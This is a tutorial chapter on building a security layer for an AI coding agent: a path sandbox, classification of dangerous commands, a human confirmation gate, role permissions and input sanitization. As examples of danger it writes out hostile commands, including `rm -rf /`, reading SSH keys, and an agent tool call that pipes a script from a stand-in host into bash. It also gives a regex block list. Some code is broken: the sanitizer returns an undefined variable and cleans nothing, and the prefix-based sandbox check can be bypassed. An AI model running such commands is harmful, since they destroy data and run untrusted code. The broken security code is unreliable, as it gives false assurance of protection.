<!-- Translated from: ch14-security-permissions.md -->

# Chapter 14: Security and Permissions

> **Motto**: "The greater the power, the more explicit the constraints must be."

> Your agent can now execute bash commands, read and write files, spawn sub-processes, and manage teams. That means it can do anything — including `rm -rf /`, reading `~/.ssh/id_rsa`, or running a malicious script downloaded from the internet. This chapter builds a security layer: enhanced path sandboxing, command classification, a confirmation gate for dangerous operations, and a tool permission model.

![Conceptual: Observability and monitoring dashboards](images/ch14/fig-14-01-concept.png)

*Figure 14-1. Security layers: sandboxes, permission gates, and role-based access control.*
## The Problem

```
You: 清理一下临时文件

Agent: [Tool: bash] rm -rf /tmp/*
```

Looks harmless? But what if the agent misunderstands the scope of "temporary files"?

```
Agent: [Tool: bash] rm -rf ./
```

Or something more insidious:

```
You: 帮我安装这个依赖

Agent: [Tool: bash] curl https://sketchy-site.com/install.sh | bash
```

The agent never questions whether a command is safe — it has no sense of "this looks dangerous." You need to add safety constraints at the harness level.

## The Solution

Three layers of defense:

1. **Path sandbox**: File operations are confined to the working directory
2. **Command classification**: Bash commands are sorted into safe / restricted / dangerous
3. **Human confirmation**: Dangerous operations pause and wait for human approval

Plus a **permission model** that spans all tools.

## 14.1 Enhanced Path Sandbox

The `safe_path()` from Chapter 2 was a simple function. Now we upgrade it to a `Sandbox` class:

```python
class Sandbox:
    def __init__(self, workspace, allowed_dirs=None):
        self.workspace = os.path.realpath(workspace)
        self._allowed = [self.workspace]
        if allowed_dirs:
            self._allowed.extend(os.path.realpath(d) for d in allowed_dirs)

    def check_path(self, path):
        resolved = os.path.realpath(os.path.join(self.workspace, path))
        for allowed in self._allowed:
            if resolved.startswith(allowed):
                return resolved
        raise PermissionError(f"路径 {path} 超出允许范围")

    def add_allowed_dir(self, path):
        self._allowed.append(os.path.realpath(path))
```

What does this give us over the old `safe_path`?

- **Multiple directories**: Worktree directories also need to be accessible
- **Dynamic expansion**: When a new worktree is created, you can add its path to the allow list
- **Unified interface**: All file operations share the same sandbox instance

Now `safe_path` becomes a thin wrapper around the Sandbox:

```python
_sandbox = Sandbox(WORKSPACE)

def safe_path(path):
    return _sandbox.check_path(path)  # 代替原来的手动检查
```

## 14.2 Command Classification

```python
DANGEROUS_PATTERNS = [
    r"\brm\s+(-rf?|--recursive)\b",
    r"\bsudo\b",
    r"\bcurl\b.*\|\s*(bash|sh)\b",
    r"\bgit\s+push\s+.*--force\b",
    r"\bgit\s+reset\s+--hard\b",
    # ...
]

RESTRICTED_COMMANDS = [
    "pip install",
    "npm install",
    "brew install",
]

def classify_command(command):
    for pattern in DANGEROUS_PATTERNS:
        if re.search(pattern, command):
            return "dangerous"
    for restricted in RESTRICTED_COMMANDS:
        if restricted in command:
            return "restricted"
    return "safe"
```

Three levels:
- **safe**: `ls`, `cat`, `git status` — executed immediately
- **restricted**: `pip install` — requires confirmation (may modify the environment)
- **dangerous**: `rm -rf`, `sudo` — must be confirmed

## 14.3 Human Confirmation Gate

```python
class ConfirmationGate:
    def needs_confirmation(self, tool_name, tool_input):
        if tool_name == "bash":
            level = classify_command(tool_input.get("command", ""))
            return level in ("dangerous", "restricted")
        return TOOL_PERMISSIONS.get(tool_name) == "dangerous"

    def request_confirmation(self, tool_name, tool_input):
        print(f"\n⚠️  危险操作需要确认:")
        print(f"  工具: {tool_name}")
        if tool_name == "bash":
            print(f"  命令: {tool_input.get('command', '')}")
        answer = input("  是否执行？(y/N): ").strip().lower()
        return answer in ("y", "yes")
```

The execution flow now looks like this:

```
Agent 调用 bash("rm -rf old/") 
  → ConfirmationGate.needs_confirmation → True
  → 打印 "⚠️  危险操作需要确认"
  → 等待用户输入 y/N
  → 用户输入 N → 返回 "[操作已被用户取消]"
  → Agent 收到取消信息，尝试其他方式
```

## 14.4 Tool Permission Model

Each tool has a permission level:

```python
TOOL_PERMISSIONS = {
    "read_file": "read",
    "write_file": "write",
    "bash": "execute",
    "shutdown_request": "dangerous",
    # ...
}
```

Each role has a set of allowed permissions:

```python
ROLE_PERMISSIONS = {
    "lead": {"read", "write", "execute", "dangerous"},
    "teammate": {"read", "write", "execute"},
    "readonly": {"read"},
}
```

Permission check:

```python
def check_tool_permission(tool_name, role="lead"):
    tool_level = TOOL_PERMISSIONS.get(tool_name, "execute")
    role_perms = ROLE_PERMISSIONS.get(role, set())
    return tool_level in role_perms
```

This solves the role-based security problem:
- **Lead**: Full permissions, including dangerous operations like shutdown
- **Teammate**: Can read, write, and execute, but cannot shut down other teammates
- **Readonly**: Can only read — useful for audit or monitoring roles

## 14.5 Security Wrapper

All security checks are applied through a single wrapper function:

```python
def make_security_wrapper(handler, tool_name, sandbox, gate, role="lead"):
    def wrapped(**kwargs):
        # 1. 权限检查
        if not check_tool_permission(tool_name, role):
            return f"[error: 角色 '{role}' 无权使用工具 '{tool_name}']"
        # 2. 输入消毒
        kwargs = sanitize_tool_input(tool_name, kwargs)
        # 3. 路径沙箱
        if sandbox and tool_name in ("read_file", "write_file", "edit_file"):
            sandbox.check_path(kwargs.get("path", ""))
        # 4. 危险操作确认
        if gate and gate.needs_confirmation(tool_name, kwargs):
            if not gate.request_confirmation(tool_name, kwargs):
                return "[操作已被用户取消]"
        # 5. 执行
        return handler(**kwargs)
    return wrapped
```

In `agent_loop`:

```python
if gate is not None:
    raw_bash = handlers["bash"]
    handlers["bash"] = make_security_wrapper(raw_bash, "bash", sandbox, gate)
```

This is the decorator pattern — instead of modifying the original handler, you wrap security checks around it.

## 14.6 Input Sanitization

Basic prompt injection defense:

```python
def sanitize_tool_input(tool_name, tool_input):
    for key, value in tool_input.items():
        if isinstance(value, str):
            value = value.replace("<|system|>", "")
            value = value.replace("<|endoftext|>", "")
            value = value.replace("\x00", "")
    return sanitized
```

This is not a perfect defense — prompt injection is an active area of research. But stripping known special tokens is basic hygiene.

## 14.7 Try It Out

```bash
cd miniagent
python agent.py
```

```
安全: 路径沙箱 + 危险操作确认
```

Try triggering the security mechanisms:

```
You: 执行 rm -rf /tmp/test

⚠️  危险操作需要确认:
  工具: bash
  命令: rm -rf /tmp/test
  是否执行？(y/N): N

Agent: 操作已被取消。我可以用更安全的方式来清理...
```

Try a path traversal:

```
You: 读取 /etc/passwd

Agent: [error: 路径 /etc/passwd 超出允许范围]
```

> **Try It Yourself**: Try getting the agent to execute `curl ... | bash` and `sudo ...`, and observe how the security mechanisms respond.

## What Changed

```
miniagent/
├── agent.py            ← CHANGED: +20 行（Security 导入、sandbox/gate 初始化、包装 bash）
├── todo.py
├── skill_loader.py
├── context.py
├── subagent.py
├── background.py
├── tasks.py
├── team.py
├── protocols.py
├── autonomous.py
├── worktree.py
├── security.py         ← NEW: 242 行（Sandbox、ConfirmationGate、权限模型、包装器）
├── requirements.txt
└── skills/
    └── code-review/
        └── SKILL.md
```

| Metric | Chapter 13 | Chapter 14 |
|--------|------------|------------|
| Tool count | 24 | **24** (no new tools — the security layer is middleware) |
| Module count | 11 | **12** (+security.py) |
| Capabilities | Git isolation | **+security sandbox + command classification + confirmation gate** |
| Defense layers | Simple safe_path | **Sandbox + Gate + Permissions** |

The security layer does not add new tools — it is **middleware**, wrapped around the existing ones. This is an important architectural principle: security should not be an add-on to features; it should be infrastructure that permeates the entire system.

The next chapter adds observability — so you can see what the agent is doing, why it is doing it, and how much it costs.

## Summary

- An agent can execute any command; safety constraints must be enforced at the harness level
- The Sandbox class extends safe_path with multi-directory support and dynamic additions
- Commands are classified into three tiers: safe / restricted / dangerous
- ConfirmationGate pauses before dangerous operations and waits for human approval
- Tool permission model: each tool has a level, each role has a set of allowed permissions
- make_security_wrapper uses the decorator pattern to layer security checks
- Basic input sanitization defends against prompt injection
- The security layer is middleware — it adds no new tools
